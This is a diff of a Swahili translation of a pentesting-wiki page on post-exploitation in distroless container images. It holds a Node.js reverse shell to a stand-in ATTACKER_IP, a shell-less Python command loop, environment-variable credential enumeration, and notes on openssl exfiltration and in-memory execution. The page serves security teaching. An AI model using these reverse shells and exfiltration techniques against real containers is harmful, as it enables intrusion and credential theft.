@@ -4,22 +4,22 @@
 
 ## Muhtasari
 
-**distroless** container image ni image inayosafirisha **minimum runtime components zinazohitajika kuendesha application moja maalum**, huku ikiondoa kwa makusudi distribution tooling za kawaida kama package managers, shells, na seti kubwa za generic userland utilities. Kwa vitendo, distroless images mara nyingi huwa na application binary au runtime pekee, shared libraries zake, certificate bundles, na filesystem layout ndogo sana.
+**distroless** container image ni image inayosafirisha **vipengele vya chini kabisa vya runtime vinavyohitajika kuendesha application moja mahususi**, huku ikiondoa kwa makusudi zana za kawaida za distribution kama vile package managers, shells, na seti kubwa za generic userland utilities. Kwa kawaida, distroless images huwa na application binary au runtime pekee, shared libraries zake, certificate bundles, na mpangilio mdogo sana wa filesystem.
 
-Lengo si kwamba distroless ni kernel isolation primitive mpya. Distroless ni **image design strategy**. Inabadilisha vinavyopatikana **ndani ya container filesystem**, si jinsi kernel inavyotenga container. Tofauti hiyo ni muhimu, kwa sababu distroless huimarisha mazingira hasa kwa kupunguza vitu ambavyo attacker anaweza kutumia baada ya kupata code execution. Haibadilishi namespaces, seccomp, capabilities, AppArmor, SELinux, au runtime isolation mechanism nyingine yoyote.
+Lengo si kwamba distroless ni kernel isolation primitive mpya. Distroless ni **image design strategy**. Hubadilisha vitu vinavyopatikana **ndani** ya container filesystem, si jinsi kernel inavyo-isolate container. Tofauti hiyo ni muhimu, kwa sababu distroless huimarisha mazingira hasa kwa kupunguza vitu ambavyo attacker anaweza kutumia baada ya kupata code execution. Haichukui nafasi ya namespaces, seccomp, capabilities, AppArmor, SELinux, au runtime isolation mechanism nyingine yoyote.
 
 ## Kwa Nini Distroless Ipo
 
 Distroless images hutumiwa hasa kupunguza:
 
-- image size
+- ukubwa wa image
 - operational complexity ya image
-- idadi ya packages na binaries zinazoweza kuwa na vulnerabilities
+- idadi ya packages na binaries ambazo zinaweza kuwa na vulnerabilities
 - idadi ya post-exploitation tools zinazopatikana kwa attacker kwa default
 
-Ndiyo maana distroless images ni maarufu katika production application deployments. Container isiyo na shell, package manager, na karibu generic tooling yoyote, kwa kawaida ni rahisi zaidi kueleweka kioperesheni na ni ngumu zaidi kutumiwa vibaya interactively baada ya compromise.
+Ndiyo sababu distroless images ni maarufu katika production application deployments. Container isiyo na shell, package manager, na karibu generic tooling yote kwa kawaida ni rahisi zaidi kuielewa ki-operational na ni ngumu zaidi kuitumia vibaya interactively baada ya compromise.
 
-Mifano ya distroless-style image families zinazojulikana ni pamoja na:
+Mifano ya familia za distroless-style images zinazojulikana ni pamoja na:
 
 - Google's distroless images
 - Chainguard hardened/minimal images
@@ -28,44 +28,44 @@ Mifano ya distroless-style image families zinazojulikana ni pamoja na:
 
 Distroless container **si**:
 
-- automatically rootless
-- automatically non-privileged
-- automatically read-only
-- automatically protected by seccomp, AppArmor, au SELinux
-- automatically salama dhidi ya container escape
+- rootless automatically
+- non-privileged automatically
+- read-only automatically
+- protected automatically na seccomp, AppArmor, au SELinux
+- salama automatically dhidi ya container escape
 
-Bado inawezekana kuendesha distroless image ikiwa na `--privileged`, host namespace sharing, dangerous bind mounts, au mounted runtime socket. Katika hali hiyo, image inaweza kuwa minimal, lakini container bado inaweza kuwa catastrophically insecure. Distroless hubadilisha **userland attack surface**, si **kernel trust boundary**.
+Bado inawezekana kuendesha distroless image kwa `--privileged`, host namespace sharing, dangerous bind mounts, au mounted runtime socket. Katika hali hiyo, image inaweza kuwa minimal, lakini container bado inaweza kuwa insecure kwa kiwango cha catastrophically. Distroless hubadilisha **userland attack surface**, si **kernel trust boundary**.
 
-## Typical Operational Characteristics
+## Sifa za Kawaida za Kioperesheni
 
-Unapocompromise distroless container, jambo la kwanza unaloligundua kwa kawaida ni kwamba assumptions za kawaida zinaacha kuwa kweli. Huenda kusiwe na `sh`, `bash`, `ls`, `id`, `cat`, na wakati mwingine hata mazingira ya libc-based ambayo yanafanya kazi kama tradecraft yako ya kawaida inavyotarajia. Hii huathiri offense na defense, kwa sababu ukosefu wa tooling hufanya debugging, incident response, na post-exploitation kuwa tofauti.
+Unapocompromise distroless container, jambo la kwanza unaloliona kwa kawaida ni kwamba assumptions za kawaida hazitumiki tena. Huenda kusiwe na `sh`, `bash`, `ls`, `id`, `cat`, na wakati mwingine hata hakuna libc-based environment inayofanya kazi kwa namna ambayo tradecraft yako ya kawaida inatarajia. Hii huathiri offense na defense, kwa sababu ukosefu wa tooling hufanya debugging, incident response, na post-exploitation kuwa tofauti.
 
-Patterns zinazotokea mara nyingi ni:
+Mifumo inayotokea mara nyingi ni:
 
-- application runtime ipo, lakini karibu kila kitu kingine hakipo
+- application runtime ipo, lakini karibu hakuna kingine
 - shell-based payloads hushindwa kwa sababu hakuna shell
 - common enumeration one-liners hushindwa kwa sababu helper binaries hazipo
-- filesystem protections kama read-only rootfs au `noexec` kwenye writable tmpfs locations mara nyingi pia huwa zipo
+- file system protections kama read-only rootfs au `noexec` kwenye writable tmpfs locations mara nyingi pia huwa zimewekwa
 
 Mchanganyiko huo ndio kwa kawaida huwafanya watu wazungumzie "weaponizing distroless".
 
 ## Distroless Na Post-Exploitation
 
-Changamoto kuu ya offensive katika distroless environment si kila mara initial RCE. Mara nyingi ni kinachofuata. Ikiwa exploited workload inakupa code execution katika language runtime kama Python, Node.js, Java, au Go, huenda ukaweza kutekeleza arbitrary logic, lakini si kupitia normal shell-centric workflows ambazo ni za kawaida kwenye Linux targets nyingine.
+Changamoto kuu ya offensive katika distroless environment si mara zote initial RCE. Mara nyingi ni kinachofuata. Ikiwa exploited workload inakupa code execution katika language runtime kama Python, Node.js, Java, au Go, unaweza kuwa na uwezo wa kutekeleza arbitrary logic, lakini si kupitia workflows za kawaida zinazoegemea shell ambazo ni maarufu kwenye Linux targets nyingine.
 
-Hii inamaanisha kuwa post-exploitation mara nyingi hubadilika na kuelekea mojawapo ya njia tatu:
+Hii inamaanisha kwamba post-exploitation mara nyingi huelekea katika mojawapo ya njia tatu:
 
 1. **Tumia language runtime iliyopo moja kwa moja** ku-enumerate environment, kufungua sockets, kusoma files, au ku-stage additional payloads.
 2. **Leta tooling yako mwenyewe kwenye memory** ikiwa filesystem ni read-only au writable locations zime-mountiwa `noexec`.
-3. **Abuse existing binaries ambazo tayari zipo kwenye image** ikiwa application au dependencies zake zina kitu chenye manufaa bila kutarajiwa.
+3. **Abuse binaries zilizopo tayari kwenye image** ikiwa application au dependencies zake zina kitu chenye manufaa ambacho hakikutarajiwa.
 
-## Abuse
+## Matumizi Mabaya
 
 ### Enumerate Runtime Uliyonayo Tayari
 
-Katika distroless containers nyingi hakuna shell, lakini bado kuna application runtime. Ikiwa target ni Python service, Python ipo. Ikiwa target ni Node.js, Node ipo. Hiyo mara nyingi hutoa functionality ya kutosha ku-enumerate files, kusoma environment variables, kufungua reverse shells, na ku-stage in-memory execution bila ku-invoke `/bin/sh` hata mara moja.
+Katika distroless containers nyingi hakuna shell, lakini bado kuna application runtime. Ikiwa target ni Python service, Python ipo. Ikiwa target ni Node.js, Node ipo. Hilo mara nyingi hutoa functionality ya kutosha ku-enumerate files, kusoma environment variables, kufungua reverse shells, na ku-stage in-memory execution bila ku-invoke `/bin/sh` hata mara moja.
 
-Mfano rahisi wa Python:
+Mfano rahisi kwa Python:
 ```bash
 python3 - <<'PY'
 import os, socket, subprocess
@@ -79,15 +79,15 @@ Mfano rahisi wa Node.js:
 ```bash
 node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
 ```
-Athari:
+Impact:
 
-- kurejeshwa kwa environment variables, mara nyingi zikiwa na credentials au service endpoints
+- urejeshaji wa environment variables, mara nyingi zikiwa na credentials au service endpoints
 - filesystem enumeration bila `/bin/ls`
 - utambuzi wa writable paths na mounted secrets
 
 ### Reverse Shell Bila `/bin/sh`
 
-Ikiwa image haina `sh` au `bash`, reverse shell ya kawaida inayotegemea shell inaweza kushindwa mara moja. Katika hali hiyo, tumia language runtime iliyosakinishwa badala yake.
+Ikiwa image haina `sh` au `bash`, reverse shell ya kawaida inayotumia shell inaweza kushindwa mara moja. Katika hali hiyo, tumia language runtime iliyosakinishwa.
 
 Python reverse shell:
 ```bash
@@ -106,11 +106,11 @@ Node reverse shell:
 ```bash
 node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
 ```
-Tena, ikiwa `/bin/sh` haipo, tumia API za Node za filesystem, process, na networking moja kwa moja badala ya kuanzisha shell.
+Tena, ikiwa `/bin/sh` haipo, tumia API za filesystem, process, na networking za Node moja kwa moja badala ya kuanzisha shell.
 
-### Full Example: No-Shell Python Command Loop
+### Mfano Kamili: Python Command Loop Bila Shell
 
-Ikiwa image ina Python lakini haina shell kabisa, loop rahisi ya interactive mara nyingi inatosha kudumisha uwezo kamili wa post-exploitation:
+Ikiwa image ina Python lakini haina shell kabisa, loop rahisi ya mwingiliano mara nyingi inatosha kudumisha uwezo kamili wa post-exploitation:
 ```bash
 python3 - <<'PY'
 import os,subprocess
@@ -123,17 +123,17 @@ print(p.stdout, end="")
 print(p.stderr, end="")
 PY
 ```
-Hii haihitaji binary ya interactive shell. Athari kwa mtazamo wa attacker ni ileile kimsingi kama shell ya kawaida: command execution, enumeration, na staging ya payloads zaidi kupitia runtime iliyopo.
+Hili halihitaji binary ya interactive shell. Athari kwa mtazamo wa mshambuliaji kwa kiasi kikubwa ni sawa na shell ya msingi: utekelezaji wa amri, enumeration, na staging ya payloads zaidi kupitia runtime iliyopo.
 
-### Uendeshaji wa Zana kwenye Kumbukumbu
+### Utekelezaji wa Zana Kwenye Kumbukumbu
 
-Distroless images mara nyingi huunganishwa na:
+Images za Distroless mara nyingi huunganishwa na:
 
 - `readOnlyRootFilesystem: true`
-- tmpfs inayoweza kuandikwa lakini yenye `noexec`, kama `/dev/shm`
-- ukosefu wa package management tools
+- tmpfs inayoweza kuandikwa lakini yenye `noexec`, kama vile `/dev/shm`
+- ukosefu wa zana za package management
 
-Mchanganyiko huo hufanya workflows za kawaida za "download binary to disk and run it" kutokuwa za kuaminika. Katika hali hizo, memory execution techniques huwa jibu kuu.
+Mchanganyiko huo hufanya workflows za kawaida za "download binary to disk and run it" zisiwe za kuaminika. Katika hali hizo, mbinu za memory execution huwa jibu kuu.
 
 Ukurasa maalum wa hilo ni:
 
@@ -141,7 +141,7 @@ Ukurasa maalum wa hilo ni:
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-Techniques muhimu zaidi humo ni:
+Mbinu muhimu zaidi zilizopo humo ni:
 
 - `memfd_create` + `execve` kupitia scripting runtimes
 - DDexec / EverythingExec
@@ -150,49 +150,49 @@ Techniques muhimu zaidi humo ni:
 
 ### Binaries Zilizopo Tayari Kwenye Image
 
-Baadhi ya distroless images bado huwa na binaries zinazohitajika kiutendaji, ambazo huwa muhimu baada ya compromise. Mfano unaoonekana mara kwa mara ni `openssl`, kwa sababu applications wakati mwingine huihitaji kwa kazi zinazohusiana na crypto- au TLS.
+Baadhi ya images za Distroless bado zina binaries zinazohitajika kiutendaji ambazo huwa muhimu baada ya compromise. Mfano unaoonekana mara kwa mara ni `openssl`, kwa sababu applications wakati mwingine huihitaji kwa kazi zinazohusiana na crypto au TLS.
 
-Search pattern ya haraka ni:
+Pattern ya haraka ya utafutaji ni:
 ```bash
 find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
 ```
 Ikiwa `openssl` ipo, inaweza kutumika kwa:
 
-- miunganisho ya TLS ya kutoka nje
-- data exfiltration kupitia channel ya egress inayoruhusiwa
-- kuweka kwa muda data ya payload kupitia blobs zilizowekewa encoding/encryption
+- outbound TLS connections
+- data exfiltration kupitia allowed egress channel
+- staging payload data kupitia encoded/encrypted blobs
 
-Matumizi mabaya halisi yanategemea kile kilichosakinishwa, lakini wazo kuu ni kwamba distroless haimaanishi "hakuna tools kabisa"; inamaanisha "tools chache zaidi kuliko image ya kawaida ya distribution".
+Matumizi mabaya husika yanategemea kile kilichosakinishwa, lakini wazo kuu ni kwamba distroless haimaanishi "hakuna tools kabisa"; inamaanisha "tools chache sana kuliko zilizo kwenye normal distribution image".
 
-## Ukaguzi
+## Checks
 
-Lengo la ukaguzi huu ni kubaini ikiwa image ni distroless kweli kwa vitendo na ni binaries zipi za runtime au helper ambazo bado zinapatikana kwa post-exploitation.
+Lengo la checks hizi ni kubaini ikiwa image ni distroless kwa vitendo na ni runtime au helper binaries zipi bado zinapatikana kwa post-exploitation.
 ```bash
 find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
 which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
 cat /etc/os-release 2>/dev/null                                # Often missing or minimal
 mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
 ```
-Nini kinachovutia hapa:
+Kinachovutia hapa:
 
-- Ikiwa hakuna shell lakini runtime kama Python au Node ipo, post-exploitation inapaswa kuelekezwa kwenye execution inayoendeshwa na runtime.
+- Ikiwa hakuna shell lakini runtime kama Python au Node ipo, post-exploitation inapaswa kuhamia kwenye execution inayoendeshwa na runtime.
 - Ikiwa root filesystem ni read-only na `/dev/shm` inaweza kuandikwa lakini ina `noexec`, mbinu za memory execution huwa muhimu zaidi.
 - Ikiwa helper binaries kama `openssl`, `busybox`, au `java` zipo, zinaweza kutoa functionality ya kutosha kuanzisha access zaidi.
 
-## Chaguo-msingi za Runtime
+## Runtime Defaults
 
-| Mtindo wa Image / platform | Hali ya chaguo-msingi | Tabia ya kawaida | Kudhoofisha kwa mikono kwa kawaida |
+| Mtindo wa image / platform | Hali ya default | Tabia ya kawaida | Udhaifu wa kawaida unaoongezwa manually |
 | --- | --- | --- | --- |
-| Google distroless style images | Userland ndogo kwa muundo | Hakuna shell, package manager, ni dependencies za application/runtime pekee | kuongeza debugging layers, sidecar shells, kunakili busybox au tooling |
+| Google distroless style images | Userland ndogo kwa muundo | Hakuna shell, hakuna package manager, ni dependencies za application/runtime pekee | kuongeza debugging layers, sidecar shells, kunakili busybox au tooling |
 | Chainguard minimal images | Userland ndogo kwa muundo | Package surface iliyopunguzwa, mara nyingi ikilenga runtime au service moja | kutumia `:latest-dev` au debug variants, kunakili tools wakati wa build |
 | Kubernetes workloads zinazotumia distroless images | Inategemea Pod config | Distroless huathiri userland pekee; security posture ya Pod bado inategemea Pod spec na runtime defaults | kuongeza ephemeral debug containers, host mounts, privileged Pod settings |
 | Docker / Podman zinazoendesha distroless images | Inategemea run flags | Filesystem ndogo, lakini runtime security bado inategemea flags na daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |
 
 Jambo kuu ni kwamba distroless ni **sifa ya image**, si protection ya runtime. Thamani yake hutokana na kupunguza vitu vinavyopatikana ndani ya filesystem baada ya compromise.
 
-## Kurasa Zinazohusiana
+## Related Pages
 
-Kwa filesystem na memory-execution bypasses zinazohitajika mara kwa mara katika mazingira ya distroless:
+Kwa filesystem na memory-execution bypasses zinazohitajika mara nyingi katika distroless environments:
 
 {{#ref}}
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
@@ -207,4 +207,5 @@ runtime-api-and-daemon-exposure.md
 {{#ref}}
 sensitive-host-mounts.md
 {{#endref}}
+
 {{#include ../../../banners/hacktricks-training.md}}
